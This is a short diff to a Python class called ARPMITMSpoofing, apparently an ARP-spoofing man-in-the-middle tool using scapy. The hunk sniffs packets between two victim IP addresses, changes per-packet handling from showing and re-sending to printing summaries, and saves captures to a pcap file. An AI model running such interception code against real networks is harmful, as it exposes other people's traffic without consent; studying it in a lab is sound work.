@@ -77,13 +77,9 @@ class ARPMITMSpoofing():
     # Sniffs incoming packets
     def sniffIncomingPackets(self):
         bpfFilter = 'ip host {} || ip host {} '.format(victimOneIP, victimTwoIP) 
-        incomingPackets = scapy.sniff(filter = bpfFilter, prn = self.processPacket) # Sniff packets until key interrupt
+        incomingPackets = scapy.sniff(filter = bpfFilter, prn = lambda x: x.summary()) # Sniff packets until key interrupt
 
         scapy.wrpcap('sniffedPackets.pcap', incomingPackets) # Save sniffed packets
-
-    def processPacket(self, packet):
-        packet.show()
-        scapy.sendp(packet)
 
     # Clean ARP tables of the victims
     def clean(self):
